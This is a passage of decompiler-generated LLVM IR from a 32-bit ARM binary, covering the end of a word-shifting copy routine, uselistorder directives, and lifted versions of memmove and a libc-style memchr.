  %v0_18d24 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d24 = add i32 %v0_18d24, 2
  store i32 %v1_18d24, i32* @r1, align 4
  br label %bb143

dec_label_pc_18d2c:                               ; preds = %dec_label_pc_18c40
  br i1 %v5_18d30, label %dec_label_pc_18d78, label %dec_label_pc_18d34

dec_label_pc_18d34:                               ; preds = %dec_label_pc_18d2c
  store i32 %v2_18d2c, i32* %r2.global-to-local, align 4
  %v3_18d38 = load i32, i32* @r4, align 4
  store i32 %v3_18d38, i32* %stack_var_-12, align 4
  %v6_18d38 = load i32, i32* @r5, align 4
  %v8_18d38 = inttoptr i32 %v6_18d38 to i8*
  store i8* %v8_18d38, i8** %stack_var_-8, align 4
  %v11_18d38 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18d3c

dec_label_pc_18d3c:                               ; preds = %dec_label_pc_18d3c.dec_label_pc_18d3c_crit_edge, %dec_label_pc_18d34
  %v0_18d60 = phi i32 [ %v1_18d60, %dec_label_pc_18d3c.dec_label_pc_18d3c_crit_edge ], [ %v0_18c8831, %dec_label_pc_18d34 ]
  %v0_18d40 = phi i32 [ %v0_18d40.pre, %dec_label_pc_18d3c.dec_label_pc_18d3c_crit_edge ], [ %v1_18c40, %dec_label_pc_18d34 ]
  %v0_18d3c = phi i32 [ %v0_18d3c.pre, %dec_label_pc_18d3c.dec_label_pc_18d3c_crit_edge ], [ %v2_18c44, %dec_label_pc_18d34 ]
  %v3_18d3c = mul i32 %v0_18d3c, 16777216
  store i32 %v3_18d3c, i32* %lr.global-to-local, align 4
  %v1_18d40 = add i32 %v0_18d40, -4
  %v2_18d40 = inttoptr i32 %v1_18d40 to i32*
  %v3_18d40 = load i32, i32* %v2_18d40, align 4
  store i32 %v3_18d40, i32* %r3.global-to-local, align 4
  %v4_18d40 = add i32 %v0_18d40, -8
  %v5_18d40 = inttoptr i32 %v4_18d40 to i32*
  %v6_18d40 = load i32, i32* %v5_18d40, align 4
  store i32 %v6_18d40, i32* %r4.global-to-local, align 4
  %v7_18d40 = add i32 %v0_18d40, -12
  %v8_18d40 = inttoptr i32 %v7_18d40 to i32*
  %v9_18d40 = load i32, i32* %v8_18d40, align 4
  store i32 %v9_18d40, i32* %r5.global-to-local, align 4
  %v10_18d40 = add i32 %v0_18d40, -16
  %v11_18d40 = inttoptr i32 %v10_18d40 to i32*
  %v12_18d40 = load i32, i32* %v11_18d40, align 4
  store i32 %v10_18d40, i32* %r1.global-to-local, align 4
  %v4_18d44 = udiv i32 %v12_18d40, 256
  %v5_18d44 = or i32 %v4_18d44, %v3_18d3c
  store i32 %v5_18d44, i32* %lr.global-to-local, align 4
  %v3_18d48 = mul i32 %v12_18d40, 16777216
  %v4_18d4c = udiv i32 %v9_18d40, 256
  %v5_18d4c = or i32 %v3_18d48, %v4_18d4c
  store i32 %v5_18d4c, i32* @ip, align 4
  %v3_18d50 = mul i32 %v9_18d40, 16777216
  %v4_18d54 = udiv i32 %v6_18d40, 256
  %v5_18d54 = or i32 %v3_18d50, %v4_18d54
  store i32 %v5_18d54, i32* %r5.global-to-local, align 4
  %v3_18d58 = mul i32 %v6_18d40, 16777216
  %v4_18d5c = udiv i32 %v3_18d40, 256
  %v5_18d5c = or i32 %v3_18d58, %v4_18d5c
  store i32 %v5_18d5c, i32* %r4.global-to-local, align 4
  %v1_18d60 = add i32 %v0_18d60, -16
  %v2_18d60 = inttoptr i32 %v1_18d60 to i32*
  store i32 %v5_18d5c, i32* %v2_18d60, align 4
  %v4_18d60 = add i32 %v0_18d60, -12
  %v5_18d60 = inttoptr i32 %v4_18d60 to i32*
  %v6_18d60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18d60, i32* %v5_18d60, align 4
  %v7_18d60 = add i32 %v0_18d60, -8
  %v8_18d60 = inttoptr i32 %v7_18d60 to i32*
  %v9_18d60 = load i32, i32* @ip, align 4
  store i32 %v9_18d60, i32* %v8_18d60, align 4
  %v10_18d60 = add i32 %v0_18d60, -4
  %v11_18d60 = inttoptr i32 %v10_18d60 to i32*
  %v12_18d60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18d60, i32* %v11_18d60, align 4
  store i32 %v1_18d60, i32* %r0.global-to-local, align 4
  %v0_18d64 = load i32, i32* %r2.global-to-local, align 4
  %v2_18d64 = add i32 %v0_18d64, -16
  store i32 %v2_18d64, i32* %r2.global-to-local, align 4
  %v6_18d68 = icmp slt i32 %v0_18d64, 16
  br i1 %v6_18d68, label %dec_label_pc_18d6c, label %dec_label_pc_18d3c.dec_label_pc_18d3c_crit_edge

dec_label_pc_18d3c.dec_label_pc_18d3c_crit_edge:  ; preds = %dec_label_pc_18d3c
  %v0_18d3c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18d40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d3c

dec_label_pc_18d6c:                               ; preds = %dec_label_pc_18d3c
  %v2_18d6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18d6c, i32* @r4, align 4
  %v5_18d6c = load i8*, i8** %stack_var_-8, align 4
  %v6_18d6c = ptrtoint i8* %v5_18d6c to i32
  store i32 %v6_18d6c, i32* @r5, align 4
  store i32 %v11_18d38, i32* @lr, align 4
  %v2_18d70 = add i32 %v0_18d64, -4
  store i32 %v2_18d70, i32* %r2.global-to-local, align 4
  %v4_18d70 = add i32 %v0_18d64, 2147483632
  %v5_18d70 = and i32 %v2_18d70, %v4_18d70
  %v6_18d70 = icmp slt i32 %v5_18d70, 0
  store i1 %v6_18d70, i1* %cpsr_v.global-to-local, align 1
  %v7_18d70 = icmp slt i32 %v2_18d70, 0
  store i1 %v7_18d70, i1* %cpsr_n.global-to-local, align 1
  %v5_18d74 = icmp slt i32 %v2_18d64, -12
  br i1 %v5_18d74, label %dec_label_pc_18d90, label %dec_label_pc_18d78

dec_label_pc_18d78:                               ; preds = %dec_label_pc_18d6c, %dec_label_pc_18d2c, %dec_label_pc_18d78
  %v1_18d84 = phi i32 [ %v5_18d84, %dec_label_pc_18d78 ], [ %v1_18d60, %dec_label_pc_18d6c ], [ %v0_18c8831, %dec_label_pc_18d2c ]
  %v0_18d78 = load i32, i32* %r3.global-to-local, align 4
  %v3_18d78 = mul i32 %v0_18d78, 16777216
  store i32 %v3_18d78, i32* %ip.global-to-local, align 4
  %v0_18d7c = load i32, i32* %r1.global-to-local, align 4
  %v1_18d7c = add i32 %v0_18d7c, -4
  %v2_18d7c = inttoptr i32 %v1_18d7c to i32*
  %v3_18d7c = load i32, i32* %v2_18d7c, align 4
  store i32 %v3_18d7c, i32* %r3.global-to-local, align 4
  store i32 %v1_18d7c, i32* %r1.global-to-local, align 4
  %v4_18d80 = udiv i32 %v3_18d7c, 256
  %v5_18d80 = or i32 %v4_18d80, %v3_18d78
  store i32 %v5_18d80, i32* @ip, align 4
  %v2_18d84 = add i32 %v1_18d84, -4
  %v3_18d84 = inttoptr i32 %v2_18d84 to i32*
  store i32 %v5_18d80, i32* %v3_18d84, align 4
  %v4_18d84 = load i32, i32* %r0.global-to-local, align 4
  %v5_18d84 = add i32 %v4_18d84, -4
  store i32 %v5_18d84, i32* %r0.global-to-local, align 4
  %v0_18d88 = load i32, i32* %r2.global-to-local, align 4
  %v2_18d88 = add i32 %v0_18d88, -4
  store i32 %v2_18d88, i32* %r2.global-to-local, align 4
  %v6_18d8c = icmp slt i32 %v0_18d88, 4
  br i1 %v6_18d8c, label %dec_label_pc_18d90.loopexit, label %dec_label_pc_18d78

dec_label_pc_18d90.loopexit:                      ; preds = %dec_label_pc_18d78
  %v4_18d88 = sub i32 3, %v0_18d88
  %v5_18d88 = and i32 %v4_18d88, %v0_18d88
  %v6_18d88 = icmp slt i32 %v5_18d88, 0
  %v7_18d88 = icmp slt i32 %v2_18d88, 0
  store i1 %v6_18d88, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18d88, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18d90

dec_label_pc_18d90:                               ; preds = %dec_label_pc_18d90.loopexit, %dec_label_pc_18d6c
  %v2_18bfc65 = phi i32 [ %v5_18d84, %dec_label_pc_18d90.loopexit ], [ %v1_18d60, %dec_label_pc_18d6c ]
  %v0_18bec61 = phi i32 [ %v2_18d88, %dec_label_pc_18d90.loopexit ], [ %v2_18d70, %dec_label_pc_18d6c ]
  %v0_18d90 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d90 = add i32 %v0_18d90, 1
  store i32 %v1_18d90, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_18d84, { 0, 2, 1 }
  uselistorder i32 %v3_18d78, { 1, 0 }
  uselistorder i32 %v2_18d70, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18d60, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18d40, { 1, 0 }
  uselistorder i32 %v3_18d3c, { 1, 0 }
  uselistorder i32 %v0_18d40, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18d60, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18d18, { 0, 2, 1 }
  uselistorder i32 %v3_18d0c, { 1, 0 }
  uselistorder i32 %v2_18d04, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18cf4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18cd4, { 1, 0 }
  uselistorder i32 %v3_18cd0, { 1, 0 }
  uselistorder i32 %v0_18cd4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18cf4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18cac, { 0, 2, 1 }
  uselistorder i32 %v3_18ca0, { 1, 0 }
  uselistorder i32 %v2_18c98, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18c88, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18c68, { 1, 0 }
  uselistorder i32 %v3_18c64, { 1, 0 }
  uselistorder i32 %v0_18c68, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18c88, { 3, 2, 1, 0 }
  uselistorder i1 %v5_18d30, { 2, 0, 1 }
  uselistorder i32 %v0_18c48, { 1, 0 }
  uselistorder i32 %v0_18d34, { 3, 0, 2, 1 }
  uselistorder i32 %v0_18c8831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18c38, { 2, 1, 0 }
  uselistorder i32 %v0_18c38, { 2, 0, 1 }
  uselistorder i32 %v2_18c30, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18c30, { 1, 0, 2 }
  uselistorder i32 %v0_18c30, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18c8832, { 2, 1, 0 }
  uselistorder i32 %v11_18c0c, { 1, 0 }
  uselistorder i32 %v7_18c0c, { 1, 0 }
  uselistorder i32 %v1_18bec, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18bec, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18bf0, { 1, 0 }
  uselistorder i32 %v7_18be4, { 0, 2, 1 }
  uselistorder i32 %v10_18be0, { 1, 0 }
  uselistorder i32 %v9_18bd8, { 1, 0, 2 }
  uselistorder i32 %v6_18bd4, { 1, 0 }
  uselistorder i32 %v2_18bcc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_18bcc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_18bdc, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18bc0, { 0, 2, 1 }
  uselistorder i32 %v13_18bbc, { 1, 0 }
  uselistorder i32 %v4_18bb8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18bb8, { 2, 0, 1 }
  uselistorder i32 %v6_18bc0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18bb0, { 0, 2, 1 }
  uselistorder i32 %v16_18bac, { 1, 0 }
  uselistorder i32 %v4_18ba8, { 1, 0 }
  uselistorder i32 %v0_18bb8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18bb0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18b9c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_18b98, { 1, 0 }
  uselistorder i32 %v1_18b94, { 1, 0 }
  uselistorder i32 %v10_18b90, { 1, 0 }
  uselistorder i32 %v0_18b90, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18b94, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_18b88, { 0, 2, 1 }
  uselistorder i32 %v2_18b7c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18b7c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_18b9449, { 1, 2, 0 }
  uselistorder i32 %v1_18b74, { 2, 1, 0 }
  uselistorder i32 %v1_18b6c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_18b64, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18b60, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18b5c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18b5c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_18b48, { 0, 2, 1 }
  uselistorder i32 %v3_18b3c, { 1, 0 }
  uselistorder i32 %v2_18b34, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18b24, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18b04, { 1, 0, 2 }
  uselistorder i32 %v5_18b04, { 1, 0, 2 }
  uselistorder i32 %v2_18b04, { 1, 0, 2 }
  uselistorder i32 %v3_18b00, { 1, 0 }
  uselistorder i32 %v0_18b04, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18b24, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_18adc, { 0, 2, 1 }
  uselistorder i32 %v3_18ad0, { 1, 0 }
  uselistorder i32 %v2_18ac8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18ab8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18a98, { 1, 0, 2 }
  uselistorder i32 %v5_18a98, { 1, 0, 2 }
  uselistorder i32 %v2_18a98, { 1, 0, 2 }
  uselistorder i32 %v3_18a94, { 1, 0 }
  uselistorder i32 %v0_18a98, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18ab8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_18a70, { 0, 2, 1 }
  uselistorder i32 %v3_18a64, { 1, 0 }
  uselistorder i32 %v2_18a5c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18a4c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18a2c, { 1, 0, 2 }
  uselistorder i32 %v5_18a2c, { 1, 0, 2 }
  uselistorder i32 %v2_18a2c, { 1, 0, 2 }
  uselistorder i32 %v3_18a28, { 1, 0 }
  uselistorder i32 %v0_18a2c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18a4c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_18af4, { 2, 0, 1 }
  uselistorder i32 %v0_18af8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_18a4c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_189fc, { 1, 0 }
  uselistorder i32 %v0_189fc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_189f4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_189f4, { 1, 0, 2 }
  uselistorder i32 %v0_189f4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18a4c76, { 2, 1, 0 }
  uselistorder i32 %v1_189d4, { 1, 0, 2 }
  uselistorder i32 %v1_189ac, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_189ac, { 1, 2, 0, 3 }
  uselistorder i32 %v8_18998, { 1, 0, 2 }
  uselistorder i32 %v6_18994, { 1, 0 }
  uselistorder i32 %v2_1898c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1898c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1899c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_18984, { 0, 2, 1 }
  uselistorder i1 %v0_18984, { 1, 0 }
  uselistorder i1 %v1_18984, { 1, 0 }
  uselistorder i32 %v3_18980, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18978, { 0, 2, 1, 3 }
  uselistorder i32 %v4_18964, { 1, 0 }
  uselistorder i32 %v12_18958, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1894c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18950, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_18940, { 0, 2, 1 }
  uselistorder i32 %v2_18938, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18938, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_18930, { 1, 0 }
  uselistorder i32 %v1_18928, { 2, 1, 0 }
  uselistorder i32 %v2_18920, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_18920, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18910, { 1, 0 }
  uselistorder i32 %v1_18910, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_18910, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 41, 1, 24, 2, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 47, 1, 27, 2, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 6, 23, 24, 3, 0, 28, 25, 26, 27, 2, 29, 30, 4, 1 }
  uselistorder label %dec_label_pc_18d78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18d0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18ca0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18c40, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_18bcc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_18b90, { 1, 0 }
  uselistorder label %dec_label_pc_18b7c, { 1, 0 }
  uselistorder label %dec_label_pc_18b3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18ad0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18a64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18a04, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_18978, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_18938, { 1, 0 }
}

define i32 @function_18d98(i32 %arg1) local_unnamed_addr {
dec_label_pc_18d98:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_18da0 = load i32, i32* @r0, align 4
  %v1_18da0 = load i32, i32* @r1, align 4
  %v2_18da0 = inttoptr i32 %v0_18da0 to i8*
  %v3_18da0 = call i32 @_memcpy(i8* %v2_18da0, i32 %v1_18da0)
  ret i32 %v3_18da0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_18db0 = load i32, i32* @r4, align 4
  %v6_18db0 = load i32, i32* @r5, align 4
  %v9_18db0 = load i32, i32* @r6, align 4
  %v1_18db4 = urem i32 %arg1, 256
  %v0_18dd018 = load i32, i32* @r2, align 4
  %v2_18dd020 = icmp eq i32 %v0_18dd018, 0
  br i1 %v2_18dd020, label %dec_label_pc_18de0, label %dec_label_pc_18dd8

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18dd8
  %v3_18dbc = load i8, i8* %.021, align 1
  %v4_18dbc = zext i8 %v3_18dbc to i32
  %v9_18dc0 = icmp eq i32 %v4_18dbc, %v1_18db4
  %v1_18dc4 = add i32 %v0_18dc4, -1
  br i1 %v9_18dc0, label %bb, label %dec_label_pc_18dd0

bb:                                               ; preds = %dec_label_pc_18dbc
  ret i32 %v1_18dd8

dec_label_pc_18dd0:                               ; preds = %dec_label_pc_18dbc
  %v2_18dcc = add i32 %v1_18dd8, 1
  %v3_18dcc = inttoptr i32 %v2_18dcc to i8*
  %v2_18dd0 = icmp eq i32 %v1_18dc4, 0
  br i1 %v2_18dd0, label %dec_label_pc_18de0, label %dec_label_pc_18dd8

dec_label_pc_18dd8:                               ; preds = %entry, %dec_label_pc_18dd0
  %v0_18dc4 = phi i32 [ %v1_18dc4, %dec_label_pc_18dd0 ], [ %v0_18dd018, %entry ]
  %.021 = phi i8* [ %v3_18dcc, %dec_label_pc_18dd0 ], [ undef, %entry ]
  %v1_18dd8 = ptrtoint i8* %.021 to i32
  %v2_18dd8 = urem i32 %v1_18dd8, 4
  %v3_18dd8 = icmp eq i32 %v2_18dd8, 0
  br i1 %v3_18dd8, label %dec_label_pc_18de0, label %dec_label_pc_18dbc

dec_label_pc_18de0:                               ; preds = %dec_label_pc_18dd0, %dec_label_pc_18dd8, %entry
  %v0_18e6c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_18dd0 ], [ %v0_18dc4, %dec_label_pc_18dd8 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_18dcc, %dec_label_pc_18dd0 ], [ %.021, %dec_label_pc_18dd8 ]
  %v4_18de0 = mul nuw nsw i32 %v1_18db4, 256
  %v5_18de0 = or i32 %v4_18de0, %v1_18db4
  %v1_18de4 = ptrtoint i8* %.0.lcssa to i32
  %v4_18de8 = mul i32 %v5_18de0, 65536
  %v5_18de8 = or i32 %v4_18de8, %v5_18de0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_18e6c37, 3
  br i1 %tmp, label %dec_label_pc_18df0, label %dec_label_pc_18e94.preheader

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18de0, %dec_label_pc_18e6c.backedge
  %v0_18e0c82 = phi i32 [ %v1_18e0c, %dec_label_pc_18e6c.backedge ], [ %v0_18e6c37, %dec_label_pc_18de0 ]
  %v0_18df081 = phi i32 [ %v4_18df0, %dec_label_pc_18e6c.backedge ], [ %v1_18de4, %dec_label_pc_18de0 ]
  %v1_18df0 = inttoptr i32 %v0_18df081 to i32*
  %v2_18df0 = load i32, i32* %v1_18df0, align 4
  %v4_18df0 = add i32 %v0_18df081, 4
  %v2_18df4 = xor i32 %v2_18df0, %v5_18de8
  %v2_18df8 = add i32 %v2_18df4, 2130640639
  %v1_18dfc = sub i32 -1, %v2_18df4
  %v2_18e00 = xor i32 %v2_18df8, %v1_18dfc
  %v2_18e04 = and i32 %v2_18e00, -2130640640
  %v2_18e08 = icmp eq i32 %v2_18e04, 0
  %v1_18e0c = add i32 %v0_18e0c82, -4
  br i1 %v2_18e08, label %dec_label_pc_18e6c.backedge, label %dec_label_pc_18e14

dec_label_pc_18e6c.backedge:                      ; preds = %dec_label_pc_18df0, %dec_label_pc_18e58
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_18e0c, 3
  br i1 %tmp107, label %dec_label_pc_18df0, label %dec_label_pc_18e94.preheader

dec_label_pc_18e14:                               ; preds = %dec_label_pc_18df0
  %v2_18e14 = inttoptr i32 %v0_18df081 to i8*
  %v3_18e14 = load i8, i8* %v2_18e14, align 1
  %v4_18e14 = zext i8 %v3_18e14 to i32
  %v9_18e1c = icmp eq i32 %v4_18e14, %v1_18db4
  %v1_18e20 = add i32 %v0_18df081, 3
  %v1_18e24 = add i32 %v0_18df081, 1
  store i32 %v1_18e24, i32* @lr, align 4
  %v1_18e28 = add i32 %v0_18df081, 2
  br i1 %v9_18e1c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_18e14
  store i32 %v3_18db0, i32* @r4, align 4
  store i32 %v6_18db0, i32* @r5, align 4
  store i32 %v9_18db0, i32* @r6, align 4
  ret i32 %v0_18df081

bb51:                                             ; preds = %dec_label_pc_18e14
  %v2_18e30 = inttoptr i32 %v1_18e24 to i8*
  %v3_18e30 = load i8, i8* %v2_18e30, align 1
  %v4_18e30 = zext i8 %v3_18e30 to i32
  %v9_18e34 = icmp eq i32 %v4_18e30, %v1_18db4
  br i1 %v9_18e34, label %dec_label_pc_18e3c, label %dec_label_pc_18e44

dec_label_pc_18e3c:                               ; preds = %bb51
  store i32 %v3_18db0, i32* @r4, align 4
  store i32 %v6_18db0, i32* @r5, align 4
  store i32 %v9_18db0, i32* @r6, align 4
  ret i32 %v1_18e24

dec_label_pc_18e44:                               ; preds = %bb51
  %v2_18e44 = inttoptr i32 %v1_18e28 to i8*
  %v3_18e44 = load i8, i8* %v2_18e44, align 1
  %v4_18e44 = zext i8 %v3_18e44 to i32
  %v9_18e48 = icmp eq i32 %v4_18e44, %v1_18db4
  br i1 %v9_18e48, label %dec_label_pc_18e50, label %dec_label_pc_18e58

dec_label_pc_18e50:                               ; preds = %dec_label_pc_18e44
  store i32 %v3_18db0, i32* @r4, align 4
  store i32 %v6_18db0, i32* @r5, align 4
  store i32 %v9_18db0, i32* @r6, align 4
  ret i32 %v1_18e28

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e44
  %v2_18e58 = inttoptr i32 %v1_18e20 to i8*
  %v3_18e58 = load i8, i8* %v2_18e58, align 1
  %v4_18e58 = zext i8 %v3_18e58 to i32
  %v9_18e5c = icmp eq i32 %v4_18e58, %v1_18db4
  br i1 %v9_18e5c, label %dec_label_pc_18e64, label %dec_label_pc_18e6c.backedge

dec_label_pc_18e64:                               ; preds = %dec_label_pc_18e58
  store i32 %v3_18db0, i32* @r4, align 4
  store i32 %v6_18db0, i32* @r5, align 4
  store i32 %v9_18db0, i32* @r6, align 4
  ret i32 %v1_18e20

dec_label_pc_18e94.preheader:                     ; preds = %dec_label_pc_18e6c.backedge, %dec_label_pc_18de0
  %v0_18df0.lcssa = phi i32 [ %v1_18de4, %dec_label_pc_18de0 ], [ %v4_18df0, %dec_label_pc_18e6c.backedge ]
  %v0_18e0c.lcssa = phi i32 [ %v0_18e6c37, %dec_label_pc_18de0 ], [ %v1_18e0c, %dec_label_pc_18e6c.backedge ]
